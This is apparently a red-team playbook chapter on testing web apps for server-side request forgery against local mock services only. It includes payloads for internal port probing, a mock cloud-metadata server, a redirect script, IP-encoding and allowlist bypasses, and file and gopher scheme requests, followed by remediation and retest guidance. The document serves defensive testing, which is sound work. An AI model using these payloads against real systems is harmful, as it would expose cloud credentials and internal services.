# 07 — SSRF and Network Trust

## 1. Scope and preconditions

The app fetches a URL, renders a remote image, imports a feed, calls a webhook, or parses a document with an external reference. SSRF is tested only against the local host and a local mock service. Never point the app at a real cloud metadata endpoint or a third-party host.

```bash
TARGET="http://127.0.0.1:5001"
OUT=".redteam/evidence/ssrf"
mkdir -p "$OUT"
```

## 2. Required Test Identities and seeded data

Anonymous if the fetch is public; user A for authenticated imports. Start a local listener and a metadata mock so a blind hit is visible:

```bash
python3 -m http.server 9099 --bind 127.0.0.1 > "$OUT/listener.log" 2>&1 &
echo $! > "$OUT/listener.pid"

python3 - <<'PY' > "$OUT/metadata.log" 2>&1 &
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"AccessKeyId":"AKIA-LOCAL-MOCK","SecretAccessKey":"mock","Token":"mock"}'
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", 9098), H).serve_forever()
PY
echo $! > "$OUT/metadata.pid"
```

## 3. Enumeration

From the outside, find every parameter that accepts a URL, host, path, image, webhook, feed, or callback. Walk the UI, read the HTML/JS, and replay every form and API call that carries a value shaped like a URL:

```bash
curl -sS "$TARGET/" -o "$OUT/home.html"
grep -oE '(url|uri|next|callback|webhook|feed|image|avatar|proxy)=[^"& ]+' "$OUT/home.html" | sort -u
```

Test `url`, `image`, `next`, `callback`, `webhook`, `feed`, `proxy`, and `redirect` on every route that accepts them.

The White-Box Auditor repeats this search on the source in Phase 3 (it must not run during the black-box phase):

```bash
grep -RInE 'https?://|url=|uri=|fetch|webhook|callback|image|avatar|import' \
  "$REPO" --exclude-dir=.git --exclude-dir=node_modules 2>/dev/null | head -50
```

## 4. Test cases

| # | Test | Exact request / command | Signal |
|---|---|---|---|
| 1 | Basic fetch | `curl -sS --get --data-urlencode "url=http://127.0.0.1:9099/" "$TARGET/api/fetch"` | Listener log hit |
| 2 | Internal port | `url=http://127.0.0.1:22/` or `:6379`, `:5432`, `:8080` | Different error or banner |
| 3 | Metadata mock | `url=http://127.0.0.1:9098/latest/meta-data/` | Mock credentials returned |
| 4 | Redirect bypass | Start a local redirector to `http://127.0.0.1:9098/`; submit the redirector URL | Redirect followed to the mock |
| 5 | Allowlist bypass | `url=http://127.0.0.1.nip.io:9098/`, `http://2130706433:9098/`, `http://[::1]:9098/` | Allowlist bypassed |
| 6 | File scheme | `url=file:///etc/hosts` | File contents returned |
| 7 | Gopher / dict | `url=gopher://127.0.0.1:6379/_INFO` | Protocol reached a local service |
| 8 | Blind SSRF | Submit a URL to the listener and watch the log; no response needed | Callback received |
| 9 | Image renderer | Upload an HTML/SVG that references `http://127.0.0.1:9098/` | Renderer fetches the mock |
| 10 | Webhook | Register `http://127.0.0.1:9099/hook` as a webhook; trigger an event | Callback received |
| 11 | DNS rebinding | Use a local hostname that resolves to 127.0.0.1 after the check; test with a short TTL | Second resolution hits loopback |
| 12 | PDF / export | Submit a document with an external image reference | Export fetches the mock |

### Redirector for test 4

```bash
python3 - <<'PY' > "$OUT/redirect.log" 2>&1 &
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302); self.send_header("Location", "http://127.0.0.1:9098/latest/meta-data/"); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", 9097), H).serve_forever()
PY
echo $! > "$OUT/redirect.pid"
curl -sS --get --data-urlencode "url=http://127.0.0.1:9097/" "$TARGET/api/fetch"
```

## 5. Bypass variants

- IP encodings: decimal (`2130706433`), octal, hex, IPv6 (`[::1]`), IPv4-mapped IPv6.
- Hostname tricks: `127.0.0.1.nip.io`, `localtest.me`, trailing dot, userinfo `http://allowed@127.0.0.1/`.
- Redirect chains, 307/308, meta refresh, JavaScript redirects in a renderer.
- URL parsers: `http://127.0.0.1:9098#@allowed`, backslashes, encoded slashes, `//`.
- Schemes: `file`, `gopher`, `dict`, `ftp`, `jar`, `netdoc`.
- Allowlist logic: prefix match, suffix match, regex without anchors, DNS rebinding.
- Blind channels: timing, error text, DNS, webhook, image dimensions.

## 6. Evidence to capture

- The request and the listener/metadata log with timestamps.
- The response body containing the mock data.
- The redirect chain and the final host.
- For blind SSRF, the callback log and the correlation ID.
- The network boundary the app crossed.

## 7. False-positive traps

- A localhost fetch may be the app calling its own health endpoint by design. Check whether the user controls the URL.
- A reflected URL in an error page is not SSRF. Require a server-side request.
- A listener hit may be the browser, not the server. Check the User-Agent and source.
- A blocked scheme may still allow a redirect to that scheme. Test both.
- Cloud metadata is out of scope; use the local mock only.

## 8. Severity guidance

| Finding | Typical severity | CWE / WSTG |
|---|---|---|
| SSRF to metadata / internal control | Critical | CWE-918, WSTG-INPV-19 |
| SSRF to internal service | High | CWE-918, API7:2023 |
| Blind SSRF with callback | Medium to High | CWE-918 |
| File scheme read | High | CWE-918, CWE-73 |
| Allowlist bypass | High | CWE-918, CWE-184 |
| Image renderer SSRF | Medium | CWE-918 |

## 9. Remediation patterns

- Use an allowlist of exact hosts and schemes; resolve the host, validate the IP, and connect to the validated IP.
- Block link-local, loopback, private ranges, and metadata addresses at the network layer.
- Disable redirects or revalidate every hop.
- Do not support `file`, `gopher`, `dict`, or arbitrary schemes.
- Run fetchers in a sandbox with no access to internal networks.
- For renderers, disable external resource loading by default.

## 10. Retest procedure

Replay each URL. Expect a rejection or a safe response, and no listener or metadata hit. Replay the redirector, the encoded IP, and the allowlist bypass. Confirm the renderer no longer fetches external references. Check the network policy, not just the application error.

## Resources

- OWASP WSTG: WSTG-INPV-19.
- OWASP API Security Top 10: API7:2023 SSRF.
- OWASP Cheat Sheet: SSRF Prevention.
- CWE-918, CWE-73, CWE-184.
- PortSwigger Academy: SSRF labs.
